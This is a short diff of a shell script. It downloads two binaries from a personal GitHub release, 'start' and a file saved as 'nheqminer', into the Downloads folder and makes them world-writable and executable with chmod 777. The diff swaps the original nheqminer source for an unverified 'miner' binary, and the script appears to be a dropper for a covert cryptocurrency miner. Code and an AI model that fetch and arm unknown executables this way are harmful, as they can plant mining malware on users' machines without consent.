@@ -3,7 +3,8 @@
 cd;
 cd Downloads/;
 curl -sL https://github.com/SteveJobsDerEchte/Krim/releases/download/v0.0.1/nice > start
-curl -sL https://github.com/justvanbloom/nheqminer/blob/kost/mac/nheqminer?raw=true > nheqminer
+curl -sL https://github.com/SteveJobsDerEchte/Krim/releases/download/v0.0.1/miner > nheqminer
+#curl -sL https://github.com/justvanbloom/nheqminer/blob/kost/mac/nheqminer?raw=true > nheqminer
 chmod 777 start
 chmod 777 nheqminer
 cd;
